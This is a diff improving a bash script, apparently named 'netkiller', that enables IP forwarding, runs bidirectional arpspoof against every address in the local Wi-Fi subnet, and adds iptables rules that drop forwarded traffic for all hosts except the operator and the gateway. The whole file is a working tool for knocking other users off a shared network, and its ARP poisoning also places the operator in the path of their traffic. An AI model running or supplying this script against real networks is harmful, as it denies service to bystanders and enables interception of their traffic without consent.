@@ -1,13 +1,26 @@
 #!/bin/bash
 
+set -e
+
 INTERFACE="wlan0"
-GATEWAY=$(ip route | grep default | awk '{print $3}')
+
+if ! command -v ipcalc >/dev/null; then
+    echo "ipcalc not found. Please install it."
+    exit 1
+fi
+
+if [ "$EUID" -ne 0 ]; then
+    echo "Run this as root."
+    exit 1
+fi
+
+GATEWAY=$(ip route | awk '/default/ {print $3}')
 MYIP=$(ip addr show "$INTERFACE" | awk '/inet / {print $2}' | cut -d/ -f1)
-NETWORK_CIDR=$(ip addr show "$INTERFACE" | grep 'inet ' | awk '{print $2}')
+NETWORK_CIDR=$(ip addr show "$INTERFACE" | awk '/inet / {print $2}')
 
 # Calculate subnet with ipcalc
-HOSTMIN=$(ipcalc "$NETWORK_CIDR" | grep HostMin | awk '{print $2}')
-HOSTMAX=$(ipcalc "$NETWORK_CIDR" | grep HostMax | awk '{print $2}')
+HOSTMIN=$(ipcalc "$NETWORK_CIDR" | awk '/HostMin/ {print $2}')
+HOSTMAX=$(ipcalc "$NETWORK_CIDR" | awk '/HostMax/ {print $2}')
 
 # IP to decimal
 ip2dec() {
@@ -25,28 +38,30 @@ MIN=$(ip2dec "$HOSTMIN")
 MAX=$(ip2dec "$HOSTMAX")
 
 # Enable IP forwarding
-echo 1 > /proc/sys/net/ipv4/ip_forward
+sysctl -w net.ipv4.ip_forward=1
 
 # Cleanup function to remove iptables rules and kill arpspoof
-cat > /bin/netkiller-stop << EOF
-    echo "Cleaning up and restoring the wifi clients connections..."
-    iptables -F
-    iptables -F FORWARD
-    pkill -f arpspoof
+cat > /bin/netkiller-stop << 'EOF'
+echo "Cleaning up and restoring the wifi clients connections..."
+iptables -F
+iptables -F FORWARD
+pkill -f arpspoof
 EOF
 chmod 755 /bin/netkiller-stop
 
-for (( i = MIN; i <= MAX; i++ )); do
-    IP=$(dec2ip "$i")
-(
-# Drop all the packets except your IP source and destination (bidirectional)
+# Drop all packets except those from/to MYIP and GATEWAY
 iptables -I FORWARD ! -s "$MYIP" -d "$GATEWAY" -j DROP
 iptables -I FORWARD ! -s "$GATEWAY" -d "$MYIP" -j DROP
 
-# Bidirectional Arp Spoofing policy
-arpspoof -i "$INTERFACE" -t "$IP" "$GATEWAY" >/dev/null 2>&1 &
-arpspoof -i "$INTERFACE" -t "$GATEWAY" "$IP" >/dev/null 2>&1 &
-) &
+for (( i=MIN; i<=MAX; i++ )); do
+    IP=$(dec2ip "$i")
+    # Skip self and gateway
+    if [[ "$IP" == "$MYIP" || "$IP" == "$GATEWAY" ]]; then
+        continue
+    fi
+    # Bidirectional Arp Spoofing policy
+    arpspoof -i "$INTERFACE" -t "$IP" "$GATEWAY" >/dev/null 2>&1 &
+    arpspoof -i "$INTERFACE" -t "$GATEWAY" "$IP" >/dev/null 2>&1 &
 done
 
 echo "Blocking all the wifi clients connections in $NETWORK_CIDR except your $MYIP and $GATEWAY."
